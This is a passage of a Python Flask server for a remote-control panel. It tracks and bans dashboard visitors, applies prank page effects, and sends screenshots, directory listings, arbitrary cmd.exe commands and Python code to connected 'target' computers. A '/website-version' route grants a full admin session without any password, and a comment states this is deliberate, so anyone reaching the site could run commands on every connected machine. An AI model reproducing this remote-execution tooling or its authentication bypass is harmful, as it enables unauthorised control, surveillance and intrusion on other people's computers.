    while len(website_sessions) > WEBSITE_SESSION_LIMIT:

        oldest = min(
            website_sessions,
            key=lambda sid: website_sessions[sid]["last_seen"]
        )

        website_sessions.pop(oldest, None)
        site_effects.pop(oldest, None)

    close_idle_website_history(now)


def record_website_session():

    sid = session.get("sid")
    now = time.time()

    with session_lock:

        if not sid:
            sid = uuid.uuid4().hex
            session["sid"] = sid

        entry = website_sessions.get(sid)

        device, browser = split_user_agent(
            request.headers.get("User-Agent", "")
        )

        if entry is None:

            path = request.path

            if request.method != "GET" or path.startswith("/api/"):
                path = "/ (dashboard)"

            website_sessions[sid] = {
                "id": sid,
                "ip": website_client_ip(),
                "agent": f"{browser} on {device}",
                "signed_in": now,
                "last_seen": now,
                "path": path,
            }

            website_history.append({
                "sid": sid,
                "entered": now,
                "seen": now,
                "left": None,
                "ip": website_client_ip(),
                "device": device,
                "browser": browser,
            })

            prune_website_sessions(now)
            prune_history(now)

            return

        entry["last_seen"] = now
        entry["ip"] = website_client_ip()
        entry["agent"] = f"{browser} on {device}"

        for record in reversed(website_history):
            if record["sid"] == sid:
                if record["left"] is not None:
                    website_history.append({
                        "sid": sid,
                        "entered": now,
                        "seen": now,
                        "left": None,
                        "ip": entry["ip"],
                        "device": device,
                        "browser": browser,
                    })
                    prune_history(now)
                else:
                    record["seen"] = now
                    record["device"] = device
                    record["browser"] = browser
                break

        if request.method == "GET" and not request.path.startswith("/api/"):
            entry["path"] = request.path


def prune_blocked_sessions(now):

    for sid in [
        sid for sid, item in blocked_sessions.items()
        if item.get("until") is not None and item["until"] <= now
    ]:
        blocked_sessions.pop(sid, None)


@app.before_request
def enforce_website_blocks():

    if request.path == "/favicon.ico":
        return

    sid = session.get("sid")

    if not sid:
        return

    now = time.time()

    with session_lock:

        prune_blocked_sessions(now)

        item = blocked_sessions.get(sid)

        if not item:
            return

        permanent = bool(item.get("permanent"))

        remaining = (
            0 if permanent
            else max(1, int(item["until"] - now) + 1)
        )

    if request.path.startswith("/api/"):

        if permanent:
            response = jsonify({
                "error": "Your access to this website has been revoked.",
                "blocked": True,
                "permanent": True
            })
        else:
            response = jsonify({
                "error": f"You are blocked for {remaining} more seconds.",
                "blocked": True,
                "permanent": False,
                "retry_after": remaining
            })

        response.status_code = 403

    else:

        response = make_response(
            render_template_string(
                BLOCKED_HTML,
                remaining=remaining,
                permanent=permanent,
                design=bool(current_site_effects().get("design"))
            ),
            403
        )

    response.headers["X-Blocked"] = "1"

    if not permanent:
        response.headers["Retry-After"] = str(remaining)

    return response


@app.before_request
def track_website_visitor():

    if not is_signed_in():
        return

    if request.path in ("/api/logs", "/favicon.ico"):
        return

    record_website_session()


def describe_website_users():

    now = time.time()

    with session_lock:
        prune_website_sessions(now)
        prune_blocked_sessions(now)
        users = sorted(
            website_sessions.values(),
            key=lambda entry: entry["last_seen"],
            reverse=True
        )
        blocked = dict(blocked_sessions)

    if not users:
        return "No one is signed in to the website."

    def ago(seconds):

        seconds = max(0, int(seconds))

        if seconds < 15:
            return "just now"
        if seconds < 60:
            return f"{seconds} seconds ago"
        if seconds < 3600:
            return f"{seconds // 60} minutes ago"
        if seconds < 86400:
            return f"{seconds // 3600} hours ago"
        return f"{seconds // 86400} days ago"

    def page_label(path):

        if not path or path == "/":
            return "/ (dashboard)"

        return path

    online = [entry for entry in users if now - entry["last_seen"] <= 120]

    lines = [
        "WEBSITE USERS",
        "-------------",
        f"Active now: {len(online)}    Signed in: {len(users)}",
        "",
    ]

    for index, entry in enumerate(users, 1):

        state = "online" if entry in online else "idle"

        block = blocked.get(entry["id"])

        if block:
            if block.get("permanent"):
                state += ", permanently banned"
            else:
                state += f", blocked for {max(1, int(block['until'] - now) + 1)}s"

        lines.append(
            f"({index}) {entry['ip']} \u2014 {entry['agent']} ({state})"
        )
        lines.append(
            "   Code: " + entry["id"][:6]
        )
        lines.append(
            "   Signed in: "
            + time.strftime(
                "%d %b %Y %H:%M UTC",
                time.gmtime(entry["signed_in"])
            )
        )
        lines.append(
            "   Last active: " + ago(now - entry["last_seen"])
        )
        lines.append(
            "   Page: " + page_label(entry.get("path"))
        )
        lines.append("")

    return "\n".join(lines).rstrip()


def resolve_website_user(token, users):

    token = (token or "").lstrip("#").lower()

    if not token:
        return None, 0

    # Positions are small; a full six-character code can be all digits.
    if token.isdigit() and len(token) <= 3:

        index = int(token)

        if 1 <= index <= len(users):
            return users[index - 1], index

    for index, entry in enumerate(users, 1):

        if entry["id"].lower().startswith(token):
            return entry, index

    return None, 0


def block_website_user(argument):

    parts = (argument or "").split()

    if not parts:
        return (
            "Usage: user-block <number or code> [seconds]\n"
            "Example: user-block 2 60\n"
            "Without seconds the block lasts 60 seconds.\n"
            "Run view-users to see the numbers and codes."
        )

    token = parts[0].lstrip("#").lower()

    seconds = BLOCK_SECONDS

    if len(parts) > 1:

        try:
            seconds = int(parts[1])
        except ValueError:
            return (
                "Block time must be a whole number of seconds, "
                "like: user-block 2 60"
            )

        if seconds < 1:
            return "Block time must be at least 1 second."

        if seconds > MAX_BLOCK_SECONDS:
            return (
                "Block time cannot be longer than "
                f"{MAX_BLOCK_SECONDS} seconds (1 day)."
            )

    now = time.time()
    current_sid = session.get("sid")

    with session_lock:

        prune_website_sessions(now)
        prune_blocked_sessions(now)

        users = sorted(
            website_sessions.values(),
            key=lambda entry: entry["last_seen"],
            reverse=True
        )

        target, position = resolve_website_user(token, users)

        if target is None:
            return (
                f"No user matches '{token}'. "
                "Run view-users to see the current numbers and codes."
            )

        if target["id"] == current_sid:
            return "You cannot block your own session."

        existing = blocked_sessions.get(target["id"])

        if existing:
            if existing.get("permanent"):
                return (
                    f"({position}) {target['ip']} is already "
                    "permanently banned. Run user-unban to lift it."
                )
            left = max(1, int(existing["until"] - now) + 1)
            return (
                f"({position}) {target['ip']} is already blocked "
                f"for {left} more seconds."
            )

        blocked_sessions[target["id"]] = {
            "until": now + seconds,
            "permanent": False,
            "ip": target["ip"],
            "agent": target["agent"],
            "created": now,
        }

    add_log("warn", f"Dashboard user blocked: ({position}) {target['ip']}")

    return (
        "USER BLOCKED\n"
        "------------\n"
        f"({position}) {target['ip']} \u2014 {target['agent']}\n"
        f"Code: {target['id'][:6]}\n"
        f"Locked out of the website for {seconds} seconds."
    )


def permban_website_user(argument):

    parts = (argument or "").split()

    if not parts:
        return (
            "Usage: user-permban <number or code>\n"
            "Example: user-permban 2\n"
            "The ban lasts until user-unban is run.\n"
            "Run view-users to see the numbers and codes."
        )

    token = parts[0].lstrip("#").lower()
    now = time.time()
    current_sid = session.get("sid")

    with session_lock:

        prune_website_sessions(now)
        prune_blocked_sessions(now)

        users = sorted(
            website_sessions.values(),
            key=lambda entry: entry["last_seen"],
            reverse=True
        )

        target, position = resolve_website_user(token, users)

        if target is None:
            return (
                f"No user matches '{token}'. "
                "Run view-users to see the current numbers and codes."
            )

        if target["id"] == current_sid:
            return "You cannot ban your own session."

        existing = blocked_sessions.get(target["id"])

        if existing and existing.get("permanent"):
            return (
                f"({position}) {target['ip']} is already "
                "permanently banned. Run user-unban to lift it."
            )

        blocked_sessions[target["id"]] = {
            "until": None,
            "permanent": True,
            "ip": target["ip"],
            "agent": target["agent"],
            "created": now,
        }

    add_log(
        "warn",
        f"Dashboard user permanently banned: ({position}) {target['ip']}"
    )

    return (
        "USER PERMANENTLY BANNED\n"
        "-----------------------\n"
        f"({position}) {target['ip']} \u2014 {target['agent']}\n"
        f"Code: {target['id'][:6]}\n"
        "Access is revoked until you run user-unban."
    )


def unban_website_user(argument):

    parts = (argument or "").split()

    if not parts:
        return (
            "Usage: user-unban <number or code>\n"
            "Lifts temporary blocks and permanent bans.\n"
            "Run bans to see the current bans and their codes."
        )

    token = parts[0].lstrip("#").lower()
    now = time.time()

    with session_lock:

        prune_website_sessions(now)
        prune_blocked_sessions(now)

        users = sorted(
            website_sessions.values(),
            key=lambda entry: entry["last_seen"],
            reverse=True
        )

        target_sid = None
        ip = ""
        agent = ""

        target, position = resolve_website_user(token, users)

        if target is not None:
            target_sid = target["id"]
            ip = target["ip"]
            agent = target["agent"]

        else:

            matches = [
                sid for sid in blocked_sessions
                if sid.lower().startswith(token)
            ]

            if len(matches) == 1:
                target_sid = matches[0]
                ip = blocked_sessions[target_sid]["ip"]
                agent = blocked_sessions[target_sid]["agent"]

                for index, entry in enumerate(users, 1):
                    if entry["id"] == target_sid:
                        position = index
                        break

        if target_sid is None:
            return (
                f"No user or ban matches '{token}'. "
                "Run bans to see the current bans."
            )

        item = blocked_sessions.pop(target_sid, None)

        if item is None:
            return f"{ip} is not banned."

    kind = "Permanent ban" if item.get("permanent") else "Temporary block"

    add_log("success", f"Dashboard ban lifted: {ip}")

    lines = [
        "USER UNBANNED",
        "-------------",
        f"{ip} \u2014 {agent}",
        f"Code: {target_sid[:6]}",
        f"{kind} lifted.",
    ]

    if position:
        lines.insert(2, f"Position: ({position})")

    return "\n".join(lines)


def describe_bans(permanent_only=False):

    now = time.time()

    with session_lock:

        prune_blocked_sessions(now)

        items = sorted(
            blocked_sessions.items(),
            key=lambda pair: pair[1].get("created", 0),
            reverse=True
        )

    if permanent_only:
        items = [
            pair for pair in items
            if pair[1].get("permanent")
        ]

    title = "PERMANENT BANS" if permanent_only else "BANS"

    if not items:
        return title + "\n" + ("-" * len(title)) + "\n(None.)"

    permanent_count = sum(1 for _, item in items if item.get("permanent"))
    temporary_count = len(items) - permanent_count

    lines = [
        title,
        "-" * len(title),
        f"Total: {len(items)}    Permanent: {permanent_count}    "
        f"Timed: {temporary_count}",
        "",
    ]

    for index, (sid, item) in enumerate(items, 1):

        if item.get("permanent"):
            state = "Permanent"
        else:
            left = max(1, int(item["until"] - now) + 1)
            state = f"{left}s left"

        lines.append(f"({index}) {item['ip']} \u2014 {item['agent']}")
        lines.append(f"    Code: {sid[:6]}   {state}")
        lines.append("")

    return "\n".join(lines).rstrip()


def current_site_effects():

    sid = session.get("sid")

    with session_lock:

        effects = dict(site_effects_global)

        if sid:
            effects.update(site_effects.get(sid) or {})

        return effects


def set_website_effect(operation, argument):

    parts = (argument or "").split()

    if len(parts) < 2:

        if operation == "theme":
            return (
                "Usage: theme <number, code, or all> <theme>\n"
                "Themes: " + ", ".join(SITE_THEMES) + ", default\n"
                "Use all to apply the theme globally."
            )

        return (
            f"Usage: {operation} <number, code, or all> true|false\n"
            f"Example: {operation} 2 true\n"
            f"Example: {operation} all true"
        )

    token = parts[0].lstrip("#").lower()
    value = parts[1].strip().lower()
    global_scope = token in ("all", "global", "everyone", "*")
    now = time.time()

    if operation == "theme":

        if value not in SITE_THEMES and value != "default":
            return (
                f"Unknown theme '{value}'. Choose: "
                + ", ".join(SITE_THEMES)
                + ", default"
            )

    elif value not in ("true", "false"):

        return (
            f"Usage: {operation} <number, code, or all> true|false\n"
            f"Example: {operation} 2 true"
        )

    with session_lock:

        prune_website_sessions(now)

        if global_scope:

            effects = site_effects_global
            target = None
            position = 0

        else:

            users = sorted(
                website_sessions.values(),
                key=lambda entry: entry["last_seen"],
                reverse=True
            )

            target, position = resolve_website_user(token, users)

            if target is None:
                return (
                    f"No user matches '{token}'. "
                    "Run view-users to see the current numbers and codes."
                )

            effects = site_effects.setdefault(target["id"], {})

        if operation == "theme":

            if value == "default":
                if global_scope:
                    effects.pop("theme", None)
                else:
                    effects["theme"] = ""
            else:
                effects["theme"] = value

        else:

            enabled = value == "true"

            if global_scope and not enabled:
                effects.pop(operation, None)
            else:
                effects[operation] = enabled

    if operation == "theme":

        add_log(
            "warn",
            (
                f"Website theme '{value}' set globally"
                if global_scope
                else f"Website theme '{value}' set for "
                     f"({position}) {target['ip']}"
            )
        )

        if global_scope:
            return (
                "GLOBAL WEBSITE THEME UPDATED\n"
                "----------------------------\n"
                "Scope: all website users, including future sessions\n"
                f"Theme: {value}"
            )

        return (
            "WEBSITE THEME UPDATED\n"
            "---------------------\n"
            f"({position}) {target['ip']} \u2014 {target['agent']}\n"
            f"Code: {target['id'][:6]}\n"
            f"Theme: {value}"
        )

    add_log(
        "warn",
        (
            f"Website effect {operation}={value} set globally"
            if global_scope
            else f"Website effect {operation}={value} for "
                 f"({position}) {target['ip']}"
        )
    )

    if global_scope:
        return (
            "GLOBAL WEBSITE EFFECT UPDATED\n"
            "-----------------------------\n"
            "Scope: all website users, including future sessions\n"
            "Per-user settings still override this.\n"
            f"{operation}: {value}"
        )

    return (
        "WEBSITE EFFECT UPDATED\n"
        "----------------------\n"
        f"({position}) {target['ip']} \u2014 {target['agent']}\n"
        f"Code: {target['id'][:6]}\n"
        f"{operation}: {value}"
    )


# ==================================================
# CONSOLE HELP AND PANEL ACCESS
# ==================================================

WEBSITE_HELP = (
    "WEBSITE COMMANDS\n"
    "----------------\n"
    "help             Website commands (type help again for device commands)\n"
    "entries          All website entries from the last 7 days\n"
    "power            Device on/off history from the last 7 days\n"
    "panels           List the function panels and their state\n"
    "enable <panel>   Show a function panel in the sidebar\n"
    "disable <panel>  Hide a function panel again\n"
    "\n"
    "WEBSITE USERS\n"
    "view-users       Show who is using the website\n"
    "user-block <user> [seconds]  Temporary block (default 60s)\n"
    "user-permban <user>          Block until unbanned\n"
    "user-unban <user>            Lift a temporary or permanent ban\n"
    "bans             List temporary and permanent bans\n"
    "permbans         List permanent bans\n"
    "\n"
    "WEBSITE UI (user = number or code; all = every user)\n"
    "theme <user|all> <name>      pink, green, purple, red, blue,\n"
    "                             yellow, dark, light, mono, hacker,\n"
    "                             default\n"
    "design <user|all> true|false Website design on/off\n"
    "                             (default off = no CSS at all)\n"
    "dyslexic <user|all> true|false   Dyslexic text styling\n"
    "flip <user|all> true|false       Turn the page upside down\n"
    "mirror <user|all> true|false     Mirror the page\n"
    "blur <user|all> true|false       Blur the page\n"
    "shake <user|all> true|false      Shake the page\n"
    "rainbow <user|all> true|false    Animated rainbow background\n"
    "caps <user|all> true|false       Force all text to uppercase\n"
    "spin <user|all> true|false       Slowly spin the page\n"
    "invert <user|all> true|false     Invert all colors\n"
    "Per-user settings override global ones.\n"
    "\n"
    "Type help again for the device commands."
)

DEVICE_HELP = (
    "DEVICE COMMANDS\n"
    "---------------\n"
    "help             Device commands (type help again for website commands)\n"
    "status           Show connection status\n"
    "pwd              Show the shared root folder\n"
    "ls [folder]      List folders in the cached directory tree\n"
    "screenshot       Request a remote screenshot\n"
    "python-setup     Check for Python and install it if missing\n"
    "\n"
    "Any other input is executed on the target computer\n"
    "through cmd.exe. Use cd to change its working directory.\n"
    "\n"
    "Type help again for the website commands."
)


def describe_panels():

    lines = ["FUNCTION PANELS", ""]

    for name in PANELS:
        state = "shown" if name in enabled_panels else "hidden"
        lines.append(name.ljust(12) + state)

    lines.append("")
    lines.append("Use enable <panel> to add one to the sidebar.")

    return "\n".join(lines)


def set_panel_access(operation, argument):

    parts = (argument or "").split()

    if not parts:
        return (
            f"Usage: {operation} <panel>\n"
            "Panels: " + ", ".join(PANELS)
        )

    token = parts[0].lstrip("#").lower()
    name = PANEL_ALIASES.get(token, token if token in PANELS else "")

    if not name:
        return "Unknown panel '" + parts[0] + "'. Choose: " + ", ".join(PANELS)

    if operation == "enable":
        enabled_panels.add(name)
        return name + " is now shown in the sidebar."

    if name == "console":
        return "The Console panel always stays visible."

    enabled_panels.discard(name)

    return name + " is hidden from the sidebar."


# ==================================================
# LOGIN ROUTES
# ==================================================

@app.route("/login", methods=["GET", "POST"])
def login():

    next_url = normalize_next(request.values.get("next", ""))

    if is_signed_in():
        return redirect(next_url or "/")

    error = ""
    username = ""

    if request.method == "POST":

        username = (request.form.get("username") or "").strip()
        password = request.form.get("password") or ""

        if (
            hmac.compare_digest(username, USERNAME)
            and hmac.compare_digest(password, PASSWORD)
        ):
            session.clear()
            session.permanent = True
            session["user"] = USERNAME
            record_website_session()

            add_site_event("website", "success", "Dashboard signed in.")

            return redirect(next_url or "/")

        error = "Incorrect username or password."

        add_site_event("website", "warn", "Failed dashboard sign-in attempt.")

    return render_template_string(
        LOGIN_HTML,
        error=error,
        next_url=next_url,
        mobile_next=next_url.startswith("/mobile"),
        username=username
    )


@app.route("/website-version")
def website_version():

    # The login page's "website version" button opens the mobile site
    # without asking for the username or password.
    next_url = normalize_next(request.values.get("next", "")) or "/mobile"

    session.clear()
    session.permanent = True
    session["user"] = USERNAME
    session["website_version"] = True

    record_website_session()

    add_site_event("website", "info", "Website version opened without sign-in.")

    return redirect(next_url)


@app.route("/logout")
def logout():

    sid = session.get("sid")

    if sid:
        with session_lock:
            website_sessions.pop(sid, None)
            close_website_history(sid, time.time())

    session.clear()

    add_site_event("website", "info", "Dashboard signed out.")

    return redirect(url_for("login"))


# ==================================================
# WEBSITE ICON ROUTE (NO STATIC FOLDER NEEDED)
# ==================================================

ICON_PATH = os.path.join(
    os.path.dirname(os.path.abspath(__file__)),
    "website.ico"
)


@app.route("/favicon.ico")
def favicon():
    try:
        with open(ICON_PATH, "rb") as f:
            icon_data = f.read()
        return send_file(
            io.BytesIO(icon_data),
            mimetype="image/vnd.microsoft.icon",
            max_age=0
        )
    except FileNotFoundError:
        return "Icon file not found", 404


# ==================================================
# DASHBOARD ROUTE
# ==================================================


@app.route("/")
@require_auth
def dashboard():
    return render_template_string(
        HTML,
        design=bool(current_site_effects().get("design"))
    )


# ==================================================
# CONSOLE PAGE
# ==================================================

@app.route("/console")
@require_auth
def console_page():

    name = request.args.get("name", "")

    with lock:
        client = clients.get(name)

    if not client:
        return "Computer not found.", 404

    if time.time() - client["last_seen"] > 60:
        return "Computer is offline.", 404

    return render_template_string(
        CONSOLE_HTML,
        name=name,
        design=bool(current_site_effects().get("design"))
    )


# ==================================================
# CONSOLE COMMAND API
# ==================================================

@app.route("/api/console/command", methods=["POST"])
@require_auth
def console_command():

    data = request.get_json(silent=True) or {}

    name = data.get("name")
    command = data.get("command", "")

    if not isinstance(command, str) or not command.strip():
        return jsonify({"error": "Invalid command."}), 400

    command = command.strip()

    if len(command) > 4000:
        return jsonify({"error": "Command is too long."}), 400

    parts = command.split(maxsplit=1)
    operation = parts[0].lower() if parts else ""
    argument = parts[1] if len(parts) > 1 else ""

    with lock:

        client = clients.get(name)

        if not client:
            return jsonify({"error": "Computer not found."}), 404

        if time.time() - client["last_seen"] > 60:
            return jsonify({"error": "Computer is offline."}), 404

        command_id = str(uuid.uuid4())
        request_id = None
        output = None

        if operation == "help":

            viewer = session.get("sid") or "-"
            now_help = time.time()
            stage = help_stage.get(viewer)

            if not stage or now_help - stage["time"] > 300:
                stage = {"count": 0, "time": now_help}
                help_stage[viewer] = stage

            output = (
                WEBSITE_HELP
                if stage["count"] % 2 == 0
                else DEVICE_HELP
            )

            stage["count"] += 1
            stage["time"] = now_help

        elif operation in (
            "entries",
            "website-entries",
            "visits",
            "website-history"
        ):

            output = describe_website_history(time.time())

        elif operation in (
            "power",
            "device-history",
            "onoff",
            "device-history-7d"
        ):

            output = describe_device_history(time.time())

        elif operation in ("panels", "functions"):

            output = describe_panels()

        elif operation in ("enable", "disable", "show", "hide"):

            output = set_panel_access(
                "enable" if operation in ("enable", "show") else "disable",
                argument
            )

        elif operation == "status":

            elapsed = int(time.time() - client["last_seen"])

            output = (
                "COMPUTER STATUS\n"
                "---------------\n"
                f"Name: {client['name']}\n"
                f"Root: {client['root']}\n"
                f"Last update: {elapsed} seconds ago\n"
                "Connection: Online"
            )

        elif operation in ("view-users", "users"):

            output = describe_website_users()

        elif operation in ("user-block", "block-user"):

            output = block_website_user(argument)

        elif operation in (
            "user-permban",
            "permban",
            "permban-user",
            "user-perm-ban"
        ):

            output = permban_website_user(argument)

        elif operation in (
            "user-unban",
            "unban",
            "unban-user",
            "user-unblock",
            "unblock-user"
        ):

            output = unban_website_user(argument)

        elif operation in ("bans", "view-bans"):

            output = describe_bans()

        elif operation == "permbans":

            output = describe_bans(permanent_only=True)

        elif operation == "theme":

            output = set_website_effect("theme", argument)

        elif operation in SITE_EFFECTS:

            output = set_website_effect(operation, argument)

        elif operation == "pwd":

            output = str(client["root"])

        elif operation == "ls":

            folder = find_folder(
                client["tree"],
                argument
            )

            if folder is None:
                return jsonify({
                    "error": "Folder not found in the reported directory tree."
                }), 404

            folders = get_folder_listing(folder)

            if not folders:
                output = "(No folders found.)"
            else:
                output = "\n".join(
                    "📁 " + item["name"]
                    for item in folders
                )

        elif operation == "screenshot":

            request_id = str(uuid.uuid4())

            screenshots[request_id] = {
                "name": name,
                "status": "pending",
                "created": time.time()
            }

            client_actions.setdefault(name, queue.Queue()).put({
                "action": "screenshot",
                "request_id": request_id
            })

            output = (
                "Screenshot request sent to the selected computer.\n"
                "Screenshot request ID: " + request_id + "\n"
                "Check the main dashboard for the screenshot."
            )

        elif operation in (
            "python-setup",
            "setup-python",
            "install-python"
        ):

            console_commands[command_id] = {
                "name": name,
                "status": "pending",
                "output": "",
                "exit_code": 0,
                "created": time.time()
            }

            client_actions.setdefault(name, queue.Queue()).put({
                "action": "python_setup",
                "command_id": command_id
            })

            return jsonify({"command_id": command_id})

        else:

            console_commands[command_id] = {
                "name": name,
                "status": "pending",
                "output": "",
                "exit_code": 0,
                "created": time.time()
            }

            client_actions.setdefault(name, queue.Queue()).put({
                "action": "console",
                "command_id": command_id,
                "command": command
            })

            return jsonify({"command_id": command_id})

        console_commands[command_id] = {
            "name": name,
            "status": "ready",
            "output": output,
            "exit_code": 0,
            "created": time.time()
        }

    payload = {"command_id": command_id}

    if request_id:
        payload["request_id"] = request_id

    return jsonify(payload)


@app.route("/upload-console", methods=["POST"])
@require_auth
def upload_console():

    command_id = request.form.get("command_id")
    name = request.form.get("name")
    output_text = request.form.get("output", "")
    exit_code = request.form.get("exit_code", "0")

    if not command_id or not name:
        return jsonify({"error": "Missing information"}), 400

    try:
        exit_code = int(exit_code)
    except ValueError:
        exit_code = 0

    with lock:

        item = console_commands.get(command_id)

        if not item or item["name"] != name:
            return jsonify({"error": "Invalid console request"}), 403

        item["output"] = output_text[:100000]
        item["exit_code"] = exit_code
        item["status"] = "ready"

    return jsonify({"success": True})


@app.route("/api/console/result/<command_id>")
@require_auth
def console_result(command_id):

    with lock:
        item = console_commands.get(command_id)

    if not item:
        return jsonify({"error": "Request not found"}), 404

    return jsonify({
        "status": item["status"],
        "output": item.get("output", ""),
        "exit_code": item.get("exit_code", 0),
        "message": item.get("message", "")
    })


# ==================================================
# REMOTE PYTHON RUNNER
# ==================================================

@app.route("/api/python/run", methods=["POST"])
@require_auth
def run_python():

    data = request.get_json(silent=True) or {}

    name = data.get("name")
    code = data.get("code", "")

    if not isinstance(code, str) or not code.strip():
        return jsonify({"error": "Python code is empty."}), 400

    if len(code) > 200000:
        return jsonify({"error": "Python code is too long."}), 400

    with lock:

        client = clients.get(name)

        if not client:
            return jsonify({"error": "Computer not found."}), 404

        if time.time() - client["last_seen"] > 60:
            return jsonify({"error": "Computer is offline."}), 404

        request_id = str(uuid.uuid4())

        python_requests[request_id] = {
            "name": name,
            "status": "pending",
            "output": "",
            "exit_code": 0,
            "created": time.time()
        }

        client_actions.setdefault(name, queue.Queue()).put({
            "action": "python",
            "request_id": request_id,
            "code": code
        })

    return jsonify({"request_id": request_id})


@app.route("/upload-python", methods=["POST"])
@require_auth
def upload_python():

    request_id = request.form.get("request_id")
    name = request.form.get("name")
    output_text = request.form.get("output", "")
    exit_code = request.form.get("exit_code", "0")

    if not request_id or not name:
        return jsonify({"error": "Missing information"}), 400

    try:
        exit_code = int(exit_code)
    except ValueError:
        exit_code = 0

    with lock:

        item = python_requests.get(request_id)

        if not item or item["name"] != name:
            return jsonify({"error": "Invalid Python request"}), 403

        item["output"] = output_text[:100000]
        item["exit_code"] = exit_code
        item["status"] = "ready"

    return jsonify({"success": True})


@app.route("/api/python/result/<request_id>")
@require_auth
def python_result(request_id):

    with lock:
        item = python_requests.get(request_id)

    if not item:
        return jsonify({"error": "Request not found"}), 404

    return jsonify({
        "status": item["status"],
        "output": item.get("output", ""),
        "exit_code": item.get("exit_code", 0)
    })


# ==================================================
# CLIENT DIRECTORY SYNC
# ==================================================

@app.route("/sync", methods=["POST"])
@require_auth
def sync():

    data = request.get_json(silent=True) or {}

    requested_name = data.get("name")
    computer_name = data.get("computer_name")
    root = data.get("root")
    tree = data.get("tree")

    if not all([
        computer_name,
        root,
        isinstance(tree, dict)
    ]):
        return jsonify({"error": "Invalid client data"}), 400

    with lock:

        now = time.time()

        if requested_name and requested_name in clients:
            assigned_name = requested_name
        else:
            assigned_name = allocate_client_name(computer_name, now)

        existing = clients.get(assigned_name)

        if existing:
            tree = merge_tree(existing["tree"], tree)

        tree["loaded"] = True

        connected = assigned_name not in clients

        clients[assigned_name] = {
            "name": assigned_name,
            "base_name": computer_name,
            "root": root,
            "tree": tree,
            "last_seen": now,
            "kind": "desktop"
        }

        client_actions.setdefault(
            assigned_name,
            queue.Queue()
        )

        record_device_online(assigned_name, now)

    if connected:
        add_site_event(
            "device",
            "success",
            f"Computer connected: {assigned_name}"
        )

    return jsonify({
        "success": True,
        "name": assigned_name
    })


# ==================================================
# CLIENT LIST
# ==================================================

@app.route("/api/clients")
@require_auth
def get_clients():

    result = []
    now = time.time()

    with lock:

        stale = [
            name for name, client in clients.items()
            if now - client["last_seen"] > OFFLINE_AFTER_SECONDS
        ]

        for name in stale:
            remove_client(name)

        for name, client in clients.items():

            result.append({
                "name": name,
                "last_seen": client["last_seen"],
                "kind": client.get("kind", "desktop")
            })

    return jsonify({
        "clients": result,
        "effects": current_site_effects(),
        "panels": sorted(enabled_panels)
    })


# ==================================================
# ACTIVITY LOG API
# ==================================================

@app.route("/api/logs")
@require_auth
def get_logs():

    try:
        after = int(request.args.get("after", 0))
    except (TypeError, ValueError):
        after = 0

    with log_lock:
        entries = [
            entry for entry in app_logs
            if entry["id"] > after
        ][-200:]

    return jsonify({
        "logs": entries,
        "started": SERVER_STARTED
    })


@app.route("/api/logs/history")
@require_auth
def get_site_logs():

    try:
        after = int(request.args.get("after", 0))
    except (TypeError, ValueError):
        after = 0

    if site_log_db_ready:

        try:

            with connect_site_log_db() as connection:

                with connection.cursor() as cursor:
                    cursor.execute(
                        f"SELECT id, created_at, level, stream, message "
                        f"FROM {SITE_LOG_TABLE} WHERE id > %s "
                        "ORDER BY id ASC LIMIT 300",
                        (after,)
                    )

                    rows = cursor.fetchall()

                    cursor.execute(
                        f"SELECT COALESCE(MAX(id), 0) "
                        f"FROM {SITE_LOG_TABLE}"
                    )

                    last = cursor.fetchone()[0] or 0

            return jsonify({
                "logs": [
                    {
                        "id": row[0],
                        "time": row[1],
                        "level": row[2],
                        "stream": row[3],
                        "message": row[4],
                    }
                    for row in rows
                ],
                "last": last,
                "started": SERVER_STARTED
            })

        except Exception:

            # A transient database error must not replay old events.
            return jsonify({
                "logs": [],
                "last": after,
                "started": SERVER_STARTED
            })

    with site_log_lock:
        combined = list(website_events) + list(device_events)

    last = max(
        (entry["id"] for entry in combined),
        default=0
    )

    entries = [
        entry for entry in combined
        if entry["id"] > after
    ]

    entries.sort(key=lambda entry: entry["id"])

    return jsonify({
        "logs": entries[-300:],
        "last": last,
        "started": SERVER_STARTED
    })


# ==================================================
# DIRECTORY TREE
# ==================================================

@app.route("/api/tree")
@require_auth
def get_tree():

    name = request.args.get("name")

    with lock:
        client = clients.get(name)

    if not client:
        return jsonify({"error": "Computer not found"}), 404

    if time.time() - client["last_seen"] > 60:
        return jsonify({"error": "Computer is offline"}), 404

    return jsonify({
        "name": client["name"],
        "root": client["root"],
        "tree": client["tree"]
    })


# ==================================================
# LAZY DIRECTORY LISTING
# ==================================================

@app.route("/api/request-listing", methods=["POST"])
@require_auth
def request_listing():

    data = request.get_json(silent=True) or {}

    name = data.get("name")
    path = data.get("path", "")

    if not name or not isinstance(path, str):
        return jsonify({"error": "Missing information"}), 400

    try:
        path = normalize_listing_path(path)
    except ValueError:
        return jsonify({"error": "Invalid path"}), 400

    with lock:

        client = clients.get(name)

        if not client:
            return jsonify({"error": "Computer not found"}), 404

        if time.time() - client["last_seen"] > 60:
            return jsonify({"error": "Computer is offline"}), 404

        request_id = str(uuid.uuid4())

        listing_requests[request_id] = {
            "name": name,
            "path": path,
            "status": "pending",
            "listing": None,
            "error": "",
            "created": time.time()
        }

        client_actions.setdefault(name, queue.Queue()).put({
            "action": "list_dir",
            "request_id": request_id,
            "path": path
        })

    return jsonify({"request_id": request_id})


@app.route("/upload-list", methods=["POST"])
@require_auth
def upload_list():

    request_id = request.form.get("request_id")
    name = request.form.get("name")
    error_text = request.form.get("error", "")
    listing_raw = request.form.get("listing", "")

    if not request_id or not name:
        return jsonify({"error": "Missing information"}), 400

    with lock:

        item = listing_requests.get(request_id)

        if not item or item["name"] != name:
            return jsonify({"error": "Invalid listing request"}), 403

        if error_text:

            item["status"] = "error"
            item["error"] = error_text[:500]

            return jsonify({"success": True})

        try:
            listing = json.loads(listing_raw or "{}")
        except (TypeError, ValueError):
            listing = None

        if not isinstance(listing, dict):

            item["status"] = "error"
            item["error"] = "Invalid directory listing."

            return jsonify({"error": item["error"]}), 400

        item["listing"] = listing
        item["status"] = "ready"
        item["error"] = ""

        client = clients.get(name)

        if client:
            store_listing(client, item["path"], listing)

    return jsonify({"success": True})


@app.route("/api/listing-status/<request_id>")
@require_auth
def listing_status(request_id):

    with lock:
        item = listing_requests.get(request_id)

    if not item:
        return jsonify({"error": "Request not found"}), 404

    return jsonify({
        "status": item["status"],
        "error": item.get("error", ""),
        "listing": item.get("listing")
    })


# ==================================================
# REQUEST SCREENSHOT
# ==================================================

@app.route("/api/request-screenshot", methods=["POST"])
@require_auth
def request_screenshot():

    data = request.get_json(silent=True) or {}

    name = data.get("name")

    if not name:
        return jsonify({"error": "Missing computer name"}), 400

    with lock:

        client = clients.get(name)

        if not client:
